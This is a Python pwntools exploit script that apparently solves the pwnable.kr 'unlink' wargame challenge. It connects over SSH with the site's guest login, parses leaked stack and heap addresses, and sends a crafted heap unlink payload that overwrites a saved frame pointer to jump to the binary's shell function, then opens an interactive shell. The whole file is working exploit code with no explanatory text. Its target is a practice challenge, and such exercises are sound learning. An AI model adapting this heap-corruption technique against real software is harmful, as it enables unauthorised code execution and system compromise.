from pwn import *
s = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
r = s.process('./unlink')
#r = process('./unlink')
#r = gdb.debug('./unlink', 'b unlink\nc')
e = ELF('./unlink')
r.recvuntil(b'stack address leak: ')
ebp = int(r.recvline(), 16) + 0x14
print(f'ebp = {hex(ebp)}')
r.recvuntil(b'heap address leak: ')
heapleak = int(r.recvline(), 16)
print(f'A = {hex(heapleak)}')
payload = p32(e.sym['shell']) + b'a'*(0x20-0x4-0x8-0x8) + p32(ebp-0x8) + p32(heapleak+0x4+0x8)
print(payload)
r.sendline(payload)
r.interactive()

